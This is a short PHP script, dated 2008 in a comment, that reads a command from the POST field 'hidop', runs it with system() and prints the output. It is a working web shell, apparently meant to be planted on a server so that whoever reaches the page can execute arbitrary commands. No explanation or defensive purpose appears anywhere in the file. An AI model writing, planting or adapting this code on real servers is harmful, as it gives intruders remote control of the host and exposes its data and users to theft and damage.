<?php

//
// Update: 2008-06-23
//


if( $_POST["hidop"] != '' ){
  $cmd = $_POST["hidop"];
} else {
  echo 'no arg error<br>';
  exit;
}

echo '<pre>';
system( $cmd );
echo '</pre>';

?>